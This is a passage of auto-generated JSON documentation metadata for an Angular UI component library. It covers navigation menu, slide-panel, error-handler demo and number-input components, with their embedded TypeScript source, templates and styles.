          "deprecationMessage": "",
          "type": "",
          "optional": false,
          "description": "",
          "line": 17,
          "modifierKind": [
            123
          ]
        },
        {
          "name": "urlPrefix",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "string",
          "optional": false,
          "description": "",
          "line": 18,
          "modifierKind": [
            123
          ]
        }
      ],
      "methodsClass": [
        {
          "name": "navigate",
          "args": [
            {
              "name": "$event",
              "type": "KeyboardEvent | MouseEvent",
              "deprecated": false,
              "deprecationMessage": ""
            },
            {
              "name": "command",
              "type": "any",
              "deprecated": false,
              "deprecationMessage": ""
            },
            {
              "name": "item",
              "type": "literal type",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 25,
          "deprecated": false,
          "deprecationMessage": "",
          "modifierKind": [
            123
          ],
          "jsdoctags": [
            {
              "name": "$event",
              "type": "KeyboardEvent | MouseEvent",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            },
            {
              "name": "command",
              "type": "any",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            },
            {
              "name": "item",
              "type": "literal type",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        }
      ],
      "deprecated": false,
      "deprecationMessage": "",
      "hostBindings": [],
      "hostListeners": [],
      "description": "",
      "rawdescription": "\n",
      "type": "component",
      "sourceCode": "import { Component, EventEmitter, Inject, Input, Optional, Output, ViewEncapsulation } from '@angular/core';\nimport { USE_HASH_ROUTING } from '../../tokens';\nimport { MenuItem, MenuItemTypes, NavigateCommand } from '../menu';\n\n@Component({\n  selector: 'sto-navigation-menu-item',\n  templateUrl: './navigation-menu-item.component.html',\n  styles: [],\n  encapsulation: ViewEncapsulation.None\n})\nexport class NavigationMenuItemComponent {\n  @Input() item: MenuItem;\n  // eslint-disable-next-line @angular-eslint/no-output-on-prefix\n  @Output()\n  // eslint-disable-next-line @angular-eslint/no-output-on-prefix\n  onCommand = new EventEmitter<NavigateCommand>();\n  public menuItemTypes = MenuItemTypes;\n  public urlPrefix: string;\n\n  constructor(@Inject(USE_HASH_ROUTING) @Optional() useHash: boolean) {\n    this.urlPrefix = useHash === false ? '/' : '#/';\n  }\n\n  // eslint-disable-next-line @typescript-eslint/no-explicit-any\n  public navigate($event: KeyboardEvent | MouseEvent, command: any, item: { error?: string; }) {\n    if ( item.error ) {\n      return;\n    }\n    this.onCommand.emit({ $event, command });\n  }\n\n}\n",
      "assetsDirs": [],
      "styleUrlsData": "",
      "stylesData": "",
      "constructorObj": {
        "name": "constructor",
        "description": "",
        "deprecated": false,
        "deprecationMessage": "",
        "args": [
          {
            "name": "useHash",
            "type": "boolean",
            "deprecated": false,
            "deprecationMessage": ""
          }
        ],
        "line": 18,
        "jsdoctags": [
          {
            "name": "useHash",
            "type": "boolean",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          }
        ]
      },
      "templateData": "<mat-list-item class=\"sto-navigation__item\"\n               (click)=\"navigate($event, item.command, item)\">\n  <ng-container *ngIf=\"!item.error; else error\">\n    <button mat-button>\n      <mat-icon *ngIf=\"item.svgIcon && item.icon\"\n                matListIcon\n                [svgIcon]=\"item.icon\"></mat-icon>\n      <mat-icon *ngIf=\"!item.svgIcon\"\n                matListIcon>{{item.icon}}</mat-icon>\n      <span class=\"sto-navigation__item__text\">\n        <ng-container *ngIf=\"item.command && item.command.type === menuItemTypes.External\">\n          <a (click)=\"$event.preventDefault()\"\n             [href]=\"item.command.arguments[0]\">\n            {{item.name}}\n          </a>\n        </ng-container>\n        <ng-container *ngIf=\"item.command && item.command.type === menuItemTypes.ExternalNew\">\n          <a (click)=\"$event.preventDefault()\"\n             [href]=\"item.command.arguments[0]\">\n            {{item.name}}\n          </a>\n          <span class=\"sto-navigation__suffix\">\n            <mat-icon>open_in_new</mat-icon>\n          </span>\n        </ng-container>\n        <ng-container *ngIf=\"item.command && item.command.type === menuItemTypes.Internal\">\n          <a (click)=\"$event.preventDefault()\"\n             [href]=\"urlPrefix + item.command.arguments.join('/')\">\n            {{item.name}}\n          </a>\n        </ng-container>\n        <ng-container *ngIf=\"item.command && item.command.type !== menuItemTypes.External\n\t\t\t && item.command.type !== menuItemTypes.ExternalNew\n\t\t\t && item.command.type !== menuItemTypes.Internal\">\n          <span>\n            <span>{{item.name}}</span>\n            <span class=\"sto-navigation__suffix\"\n                  *ngIf=\"item.command.type === menuItemTypes.Navigate\">\n              <mat-icon>keyboard_arrow_right</mat-icon>\n            </span>\n          </span>\n        </ng-container>\n\n      </span>\n    </button>\n  </ng-container>\n  <ng-template #error>\n    <button mat-button\n            disabled=\"disabled\">\n      <mat-icon *ngIf=\"item.svgIcon && item.icon\"\n                matListIcon\n                [svgIcon]=\"item.icon\"></mat-icon>\n      <mat-icon *ngIf=\"!item.svgIcon\"\n                matListIcon>{{item.icon}}</mat-icon>\n      <span class=\"sto-navigation__item__text sto-navigation__item__text--error\">{{item.name}}</span>\n    </button>\n  </ng-template>\n</mat-list-item>\n"
    },
    {
      "name": "NavigationPartComponent",
      "id": "component-NavigationPartComponent-56280463769c78d1df56fde3ef3133d66e9076f5427e4d807efed25ad073338af10b7007c3e520354d993db81cbd851745463d2a49224cb6f11cb3e87278283d",
      "file": "libs/drawer/src/lib/sto-navigation/navigation-part/navigation-part.component.ts",
      "changeDetection": "ChangeDetectionStrategy.OnPush",
      "encapsulation": [
        "ViewEncapsulation.None"
      ],
      "entryComponents": [],
      "inputs": [],
      "outputs": [],
      "providers": [],
      "selector": "sto-slide-panel",
      "styleUrls": [
        "./navigation-part.component.scss"
      ],
      "styles": [],
      "templateUrl": [
        "./navigation-part.component.html"
      ],
      "viewProviders": [],
      "inputsClass": [
        {
          "name": "activePane",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 21,
          "type": "PaneType",
          "decorators": []
        }
      ],
      "outputsClass": [],
      "propertiesClass": [
        {
          "name": "baseClass",
          "defaultValue": "true",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "optional": false,
          "description": "",
          "line": 23,
          "decorators": [
            {
              "name": "HostBinding",
              "stringifiedArguments": "'class.sto-slide-panel'"
            }
          ]
        }
      ],
      "methodsClass": [],
      "deprecated": false,
      "deprecationMessage": "",
      "hostBindings": [
        {
          "name": "class.sto-slide-panel",
          "defaultValue": "true",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 23,
          "type": "boolean",
          "decorators": []
        }
      ],
      "hostListeners": [],
      "description": "",
      "rawdescription": "\n",
      "type": "component",
      "sourceCode": "import { ChangeDetectionStrategy, Component, HostBinding, Input, ViewEncapsulation } from '@angular/core';\nimport { animate, state, style, transition, trigger } from '@angular/animations';\n\nexport type PaneType = 'left' | 'right';\n\n@Component({\n  selector: 'sto-slide-panel',\n  styleUrls: ['./navigation-part.component.scss'],\n  templateUrl: './navigation-part.component.html',\n  changeDetection: ChangeDetectionStrategy.OnPush,\n  encapsulation: ViewEncapsulation.None,\n  animations: [\n    trigger('slide', [\n      state('left', style({transform: 'translateX(0)'})),\n      state('right', style({transform: 'translateX(-50%)'})),\n      transition('left <=> right', animate('300ms ease'))\n    ])\n  ]\n})\nexport class NavigationPartComponent {\n  @Input() activePane: PaneType;\n  @HostBinding('class.sto-slide-panel')\n  baseClass = true;\n}\n",
      "assetsDirs": [],
      "styleUrlsData": [
        {
          "data": ":host {\n  display: block;\n  overflow: hidden;\n}\n\n.panes {\n  min-height: calc(100% - 40px);\n  width: 200%;\n\n  display: flex;\n  div {\n    flex: 1;\n  }\n}\n",
          "styleUrl": "./navigation-part.component.scss"
        }
      ],
      "stylesData": "",
      "templateData": "<div class=\"panes\" [@slide]=\"activePane\">\n  <div><ng-content select=\"[leftPane]\"></ng-content></div>\n  <div><ng-content select=\"[rightPane]\"></ng-content></div>\n</div>\n"
    },
    {
      "name": "NextWrapperComponent",
      "id": "component-NextWrapperComponent-76dbeb67c05168c1d4f6862dbe89f181cf4f845ed02296a6bf6df841971cc943095e99b6be10c7e55350d83683723899f2846b7a0f07c70f177b522e799322a1",
      "file": "libs/error-handler/src/lib/wrapper.ts",
      "encapsulation": [],
      "entryComponents": [],
      "inputs": [],
      "outputs": [],
      "providers": [],
      "selector": "next-wrapper",
      "styleUrls": [],
      "styles": [],
      "template": "<button mat-button\n        (click)=\"overRide(404)\">Overridden 404\n</button>\n<button mat-button\n        (click)=\"showError(s)\"\n        *ngFor=\"let s of errors\">{{s}} {{ s === 401 ? '(App Override)' : ''}}</button>\n",
      "templateUrl": [],
      "viewProviders": [],
      "inputsClass": [],
      "outputsClass": [],
      "propertiesClass": [
        {
          "name": "errors",
          "defaultValue": "[\n    0,\n    400,\n    401,\n    403,\n    404,\n    409,\n    500,\n    501,\n    503\n  ]",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "[]",
          "optional": false,
          "description": "",
          "line": 26,
          "modifierKind": [
            123
          ]
        }
      ],
      "methodsClass": [
        {
          "name": "overRide",
          "args": [
            {
              "name": "status",
              "type": "number",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 53,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "status",
              "type": "number",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "showError",
          "args": [
            {
              "name": "status",
              "type": "number",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 41,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "status",
              "type": "number",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        }
      ],
      "deprecated": false,
      "deprecationMessage": "",
      "hostBindings": [],
      "hostListeners": [],
      "description": "",
      "rawdescription": "\n",
      "type": "component",
      "sourceCode": "import { Component, Injectable, NgModule } from '@angular/core';\nimport { HttpClient, HttpClientModule, HttpErrorResponse } from '@angular/common/http';\nimport { CommonModule } from '@angular/common';\nimport { MatButtonModule } from '@angular/material/button';\nimport {\n  CUSTOM_ERROR_HANDLER, ERROR_LOGGER,\n  ErrorHandlerService,\n  Handler,\n  HttpError,\n  StoErrorHandler\n} from '@ngx-stoui/error-handler';\n\n@Component({\n  selector: 'next-wrapper',\n  template: `\n    <button mat-button\n            (click)=\"overRide(404)\">Overridden 404\n    </button>\n    <button mat-button\n            (click)=\"showError(s)\"\n            *ngFor=\"let s of errors\">{{s}} {{ s === 401 ? '(App Override)' : ''}}</button>\n  `,\n  providers: []\n})\nexport class NextWrapperComponent {\n  public errors = [\n    0,\n    400,\n    401,\n    403,\n    404,\n    409,\n    500,\n    501,\n    503\n  ];\n\n  constructor(private service: ErrorHandlerService) {\n  }\n\n  showError(status: number) {\n    const err = new HttpErrorResponse({\n      status,\n      error: {\n        message: 'server error message'\n      },\n      statusText: 'Error',\n      url: 'http://errorhandler/api'\n    });\n    this.service.handler(err);\n  }\n\n  overRide(status: number) {\n    const err = new HttpErrorResponse({\n      status,\n      error: {\n        message: 'server error message'\n      },\n      statusText: 'Error',\n      url: 'http://errorhandler/api'\n    });\n    const handler = function (err: HttpErrorResponse) {\n      const e = new HttpError(err);\n      e.title = 'Local override 404';\n      e.text = 'Local override not found item';\n      return e;\n    };\n    this.service.handler(err, handler);\n  }\n}\n\n@Injectable({\n  providedIn: 'root'\n})\nexport class ErrorHandlerImpl implements StoErrorHandler {\n  [ code: number ]: Handler;\n\n  401(err: HttpErrorResponse) {\n    const error = new HttpError(err);\n    error.title = 'Custom not signed in';\n    error.text = 'Custom not signed in text';\n    return error;\n  }\n}\n\n@Injectable({\n  providedIn: 'root'\n})\nexport class Logger {\n  constructor(private http: HttpClient) {\n  }\n\n  log(err: HttpError) {\n    // This method will typically go to the application backend or a central log repository\n    console.log('Error', err);\n  }\n}\n\nfunction LoggerFactory(http: HttpClient) {\n  return new Logger(http);\n}\n\n@NgModule({\n  declarations: [ NextWrapperComponent ],\n  imports: [ CommonModule, MatButtonModule, HttpClientModule ],\n  exports: [ NextWrapperComponent ],\n  providers: [\n    { provide: CUSTOM_ERROR_HANDLER, useClass: ErrorHandlerImpl },\n    { provide: ERROR_LOGGER, useFactory: LoggerFactory, deps: [ HttpClient ] }\n  ]\n})\nexport class WrapperModule {\n}\n\n",
      "assetsDirs": [],
      "styleUrlsData": "",
      "stylesData": "",
      "constructorObj": {
        "name": "constructor",
        "description": "",
        "deprecated": false,
        "deprecationMessage": "",
        "args": [
          {
            "name": "service",
            "type": "ErrorHandlerService",
            "deprecated": false,
            "deprecationMessage": ""
          }
        ],
        "line": 36,
        "jsdoctags": [
          {
            "name": "service",
            "type": "ErrorHandlerService",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          }
        ]
      }
    },
    {
      "name": "NumberInputComponent",
      "id": "component-NumberInputComponent-18bf46c6e2c3a19cd9fa7329e2a97db1296ae28fd6c6c557afda770d8bad1139d0ea08b1b42e50fb8762c59674c60da02ff8c0457b65543499b22df2f2847c0d",
      "file": "libs/form/src/lib/number-input/number-input/number-input.component.ts",
      "changeDetection": "ChangeDetectionStrategy.OnPush",
      "encapsulation": [
        "ViewEncapsulation.None"
      ],
      "entryComponents": [],
      "inputs": [],
      "outputs": [],
      "providers": [
        {
          "name": "{ provide: MatFormFieldControl, useExisting: NumberInputComponent }",
          "type": "component"
        }
      ],
      "selector": "sto-number-input",
      "styleUrls": [
        "./number-input.component.scss"
      ],
      "styles": [],
      "templateUrl": [
        "./number-input.component.html"
      ],
      "viewProviders": [],
      "inputsClass": [
        {
          "name": "disabled",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 91,
          "type": "boolean",
          "decorators": []
        },
        {
          "name": "dynamicFractionSize",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 46,
          "type": "boolean",
          "decorators": []
        },
        {
          "name": "fractionSize",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 117,
          "type": "number",
          "decorators": []
        },
        {
          "name": "placeholder",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 138,
          "type": "string",
          "decorators": []
        },
        {
          "name": "readonly",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 105,
          "type": "boolean",
          "decorators": []
        },
        {
          "name": "required",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 162,
          "type": "boolean",
          "decorators": []
        },
        {
          "name": "tabIndex",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 150,
          "type": "number",
          "decorators": []
        },
        {
          "name": "value",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 174,
          "type": "number",
          "decorators": []
        }
      ],
      "outputsClass": [
        {
          "name": "ngModelChange",
          "defaultValue": "new EventEmitter<number | null>()",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 53,
          "type": "EventEmitter"
        }
      ],
      "propertiesClass": [
        {
          "name": "_disabled",
          "defaultValue": "false",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "optional": false,
          "description": "",
          "line": 88,
          "modifierKind": [
            121
          ]
        },
        {
          "name": "_fractionSize",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "number",
          "optional": false,
          "description": "",
          "line": 114,
          "modifierKind": [
            121
          ]
        },
        {
          "name": "_placeholder",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "string",
          "optional": false,
          "description": "",
          "line": 135,
          "modifierKind": [
            121
          ]
        },
        {
          "name": "_readonly",
          "defaultValue": "false",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "optional": false,
          "description": "",
          "line": 102,
          "modifierKind": [
            121
          ]
        },
        {
          "name": "_required",
          "defaultValue": "false",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "optional": false,
          "description": "",
          "line": 159,
          "modifierKind": [
            121
          ]
        },
        {
          "name": "_tabIndex",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "number",
          "optional": false,
          "description": "",
          "line": 147,
          "modifierKind": [
            121
          ]
        },
        {
          "name": "_value",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "number | null",
          "optional": false,
          "description": "",
          "line": 171,
          "modifierKind": [
            121
          ]
        },
        {
          "name": "autofilled",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "boolean",
          "optional": false,
          "description": "",
          "line": 41
        },
        {
          "name": "controlType",
          "defaultValue": "'number-input'",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "string",
          "optional": false,
          "description": "",
          "line": 42
        },
        {
          "name": "ctrl",
          "defaultValue": "new FormControl<string | number | null>(null)",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "optional": false,
          "description": "",
          "line": 43
        },
        {
          "name": "describedBy",
          "defaultValue": "''",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "string",
          "optional": false,
          "description": "",
          "line": 50,
          "decorators": [
            {
              "name": "HostBinding",
              "stringifiedArguments": "'attr.aria-describedby'"
            }
          ]
        },
        {
          "name": "errorState",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "boolean",
          "optional": false,
          "description": "",
          "line": 51,
          "inheritance": {
            "file": "FormFieldBase"
          }
        },
        {
          "name": "focused",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "boolean",
          "optional": false,
          "description": "",
          "line": 40
        },
        {
          "name": "id",
          "defaultValue": "`value-unit-input-${NumberInputComponent.nextId++}`",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "optional": false,
          "description": "",
          "line": 48,
          "decorators": [
            {
              "name": "HostBinding",
              "stringifiedArguments": ""
            }
          ]
        },
        {
          "name": "nextId",
          "defaultValue": "0",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "number",
          "optional": false,
          "description": "",
          "line": 38,
          "modifierKind": [
            124
          ]
        },
        {
          "name": "ngControl",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "NgControl",
          "optional": false,
          "description": "",
          "line": 67,
          "decorators": [
            {
              "name": "Optional",
              "stringifiedArguments": ""
            },
            {
              "name": "Self",
              "stringifiedArguments": ""
            }
          ],
          "modifierKind": [
            123
          ],
          "inheritance": {
            "file": "FormFieldBase"
          }
        },
        {
          "name": "numberFormatter",
          "defaultValue": "new NumberInputPipe()",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "optional": false,
          "description": "",
          "line": 54,
          "modifierKind": [
            121
          ]
        },
        {
          "name": "onChange",
          "defaultValue": "() => {...}",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "optional": false,
          "description": "",
          "line": 226
        },
        {
          "name": "onTouched",
          "defaultValue": "() => {...}",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "optional": false,
          "description": "",
          "line": 229
        },
        {
          "name": "stateChanges",
          "defaultValue": "new Subject<void>()",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "optional": false,
          "description": "",
          "line": 39,
          "inheritance": {
            "file": "FormFieldBase"
          }
        },
        {
          "name": "sub",
          "defaultValue": "new Subscription()",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "optional": false,
          "description": "",
          "line": 44,
          "modifierKind": [
            123
          ]
        },
        {
          "name": "_defaultErrorStateMatcher",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "ErrorStateMatcher",
          "optional": false,
          "description": "",
          "line": 19,
          "modifierKind": [
            123
          ],
          "inheritance": {
            "file": "FormFieldBase"
          }
        },
        {
          "name": "_elementRef",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "ElementRef",
          "optional": false,
          "description": "",
          "line": 18,
          "modifierKind": [
            123
          ],
          "inheritance": {
            "file": "FormFieldBase"
          }
        },
        {
          "name": "_parentForm",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "NgForm",
          "optional": false,
          "description": "",
          "line": 20,
          "modifierKind": [
            123
          ],
          "inheritance": {
            "file": "FormFieldBase"
          }
        },
        {
          "name": "_parentFormGroup",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "FormGroupDirective",
          "optional": false,
          "description": "",
          "line": 21,
          "modifierKind": [
            123
          ],
          "inheritance": {
            "file": "FormFieldBase"
          }
        },
        {
          "name": "errorStateMatcher",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "ErrorStateMatcher",
          "optional": false,
          "description": "",
          "line": 16,
          "inheritance": {
            "file": "FormFieldBase"
          }
        }
      ],
      "methodsClass": [
        {
          "name": "matOnTouched",
          "args": [],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 232,
          "deprecated": false,
          "deprecationMessage": ""
        },
        {
          "name": "ngDoCheck",
          "args": [],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 185,
          "deprecated": false,
          "deprecationMessage": ""
        },
        {
          "name": "ngOnDestroy",
          "args": [],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 210,
          "deprecated": false,
          "deprecationMessage": ""
        },
        {
          "name": "ngOnInit",
          "args": [],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 191,
          "deprecated": false,
          "deprecationMessage": ""
        },
        {
          "name": "onContainerClick",
          "args": [
            {
              "name": "event",
              "type": "MouseEvent",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 217,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "event",
              "type": "MouseEvent",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "registerOnChange",
          "args": [
            {
              "name": "fn",
              "type": "never",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 240,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "fn",
              "type": "never",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "registerOnTouched",
          "args": [
            {
              "name": "fn",
              "type": "never",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 244,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "fn",
              "type": "never",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "setDescribedByIds",
          "args": [
            {
              "name": "ids",
              "type": "string[]",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 221,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "ids",
              "type": "string[]",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "setDisabledState",
          "args": [
            {
              "name": "isDisabled",
              "type": "boolean",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 248,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "isDisabled",
              "type": "boolean",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "writeValue",
          "args": [
            {
              "name": "value",
              "type": "number",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 236,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "value",
              "type": "number",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "updateErrorState",
          "args": [],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 25,
          "deprecated": false,
          "deprecationMessage": "",
          "inheritance": {
            "file": "FormFieldBase"
          }
        }
      ],
      "deprecated": false,
      "deprecationMessage": "",
      "hostBindings": [
        {
          "name": "attr.aria-describedby",
          "defaultValue": "''",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 50,
          "type": "string",
          "decorators": []
        },
        {
          "name": "class.floating",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 84,
          "type": "boolean",
          "decorators": []
        },
        {
          "name": "id",
          "defaultValue": "`value-unit-input-${NumberInputComponent.nextId++}`",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 48,
          "type": "string",
          "decorators": []
        }
      ],
      "hostListeners": [],
      "description": "",
      "rawdescription": "\n",
      "type": "component",
      "sourceCode": "import {\n  ChangeDetectionStrategy,\n  Component,\n  DoCheck,\n  ElementRef,\n  EventEmitter,\n  HostBinding,\n  Input,\n  OnDestroy,\n  OnInit,\n  Optional,\n  Output,\n  Self,\n  ViewEncapsulation\n} from '@angular/core';\nimport { ControlValueAccessor, FormControl, FormGroupDirective, NgControl, NgForm } from '@angular/forms';\nimport { MatFormFieldControl } from '@angular/material/form-field';\nimport { Subject, Subscription } from 'rxjs';\nimport { FocusMonitor } from '@angular/cdk/a11y';\nimport { NumberInputPipe } from '../number-input.pipe';\nimport { coerceBooleanProperty } from '@angular/cdk/coercion';\nimport { startWith } from 'rxjs/operators';\nimport { ErrorStateMatcher } from '@angular/material/core';\nimport { FormFieldBase } from '../../sto-form/form-field.base';\n\n\n@Component({\n  selector: 'sto-number-input',\n  templateUrl: './number-input.component.html',\n  styleUrls: [ './number-input.component.scss' ],\n  encapsulation: ViewEncapsulation.None,\n  changeDetection: ChangeDetectionStrategy.OnPush,\n  providers: [\n    { provide: MatFormFieldControl, useExisting: NumberInputComponent }\n  ]\n})\nexport class NumberInputComponent extends FormFieldBase implements DoCheck, OnInit, OnDestroy, ControlValueAccessor, MatFormFieldControl<number> {\n  static nextId = 0;\n  stateChanges = new Subject<void>();\n  focused: boolean;\n  autofilled: boolean;\n  controlType = 'number-input';\n  ctrl = new FormControl<string | number | null>(null);\n  public sub = new Subscription();\n  @Input()\n  dynamicFractionSize: boolean;\n  @HostBinding()\n  id = `value-unit-input-${NumberInputComponent.nextId++}`;\n  @HostBinding('attr.aria-describedby')\n  describedBy = '';\n  errorState: boolean;\n  @Output()\n  ngModelChange = new EventEmitter<number | null>();\n  private numberFormatter = new NumberInputPipe();\n\n  /*  get errorState() {\n      return this._errorState && (this.ngControl ? this.ngControl.touched : false);\n    }\n\n    set errorState(errorState) {\n      this._errorState = errorState;\n      this.stateChanges.next();\n    }\n\n    private _errorState: boolean;*/\n\n  constructor(@Optional() @Self() public ngControl: NgControl,\n              private fm: FocusMonitor,\n              @Optional() _parentForm: NgForm,\n              @Optional() _parentFormGroup: FormGroupDirective,\n              _defaultErrorStateMatcher: ErrorStateMatcher,\n              private elRef: ElementRef<HTMLElement>) {\n    super(elRef, _defaultErrorStateMatcher, _parentForm, _parentFormGroup, ngControl);\n    if ( this.ngControl != null ) {\n      this.ngControl.valueAccessor = this;\n    }\n    fm.monitor(elRef.nativeElement, true).subscribe(origin => {\n      this.focused = !!origin;\n      this.stateChanges.next();\n    });\n  }\n\n  @HostBinding('class.floating')\n  get shouldLabelFloat() {\n    return this.focused || !this.empty;\n  }\n\n  private _disabled = false;\n\n  @Input()\n  get disabled(): boolean {\n    return this._disabled;\n  }\n\n  set disabled(value: boolean) {\n    this._disabled = coerceBooleanProperty(value);\n    const opts = { onlySelf: true, emitEvent: false };\n    this._disabled ? this.ctrl.disable(opts) : this.ctrl.enable(opts);\n    this.stateChanges.next();\n  }\n\n  private _readonly = false;\n\n  @Input()\n  get readonly(): boolean {\n    return this._readonly;\n  }\n\n  set readonly(value: boolean) {\n    this._readonly = coerceBooleanProperty(value);\n    this.stateChanges.next();\n  }\n\n  private _fractionSize: number;\n\n  @Input()\n  get fractionSize() {\n    return this._fractionSize;\n  }\n\n  set fractionSize(fractionSize) {\n    if ( !fractionSize && fractionSize !== 0 ) {\n      fractionSize = 3;\n    }\n    this._fractionSize = fractionSize;\n    this.value = this._value;\n    this.stateChanges.next();\n  }\n\n  get empty() {\n    const value = this.ctrl.value;\n    return !( value && value !== 0 );\n  }\n\n  private _placeholder: string;\n\n  @Input()\n  get placeholder() {\n    return this._placeholder || '';\n  }\n\n  set placeholder(plh) {\n    this._placeholder = plh;\n    this.stateChanges.next();\n  }\n\n  private _tabIndex: number;\n\n  @Input()\n  get tabIndex() {\n    return this._tabIndex;\n  }\n\n  set tabIndex(tabIndex) {\n    this._tabIndex = tabIndex;\n    this.stateChanges.next();\n  }\n\n  private _required = false;\n\n  @Input()\n  get required() {\n    return this._required;\n  }\n\n  set required(req) {\n    this._required = coerceBooleanProperty(req);\n    this.stateChanges.next();\n  }\n\n  private _value: number | null;\n\n  @Input()\n  get value() {\n    return this._value;\n  }\n\n  set value(value) {\n    this._value = value;\n    const valueAsString = this.numberFormatter.transform(value, this.fractionSize, this.dynamicFractionSize);\n    this.ctrl.setValue(valueAsString, { emitEvent: false });\n    this.stateChanges.next();\n  }\n\n  ngDoCheck(): void {\n    if ( this.ngControl ) {\n      this.updateErrorState();\n    }\n  }\n\n  ngOnInit(): void {\n    const sub = this.ctrl.valueChanges\n      .subscribe((value) => {\n        let numericValue: null | number = parseFloat(this.numberFormatter.parse(value as string, this.fractionSize, this.dynamicFractionSize));\n        numericValue = isNaN(numericValue) ? null : numericValue;\n        this.onChange(numericValue);\n        this.ngModelChange.emit(numericValue);\n      });\n\n    this.sub.add(sub);\n    if ( this.ngControl && this.ngControl.statusChanges ) {\n      this.sub.add(this.ngControl.statusChanges\n        .pipe(startWith(this.ngControl.status))\n        .subscribe(() => {\n          this.updateErrorState();\n        }));\n  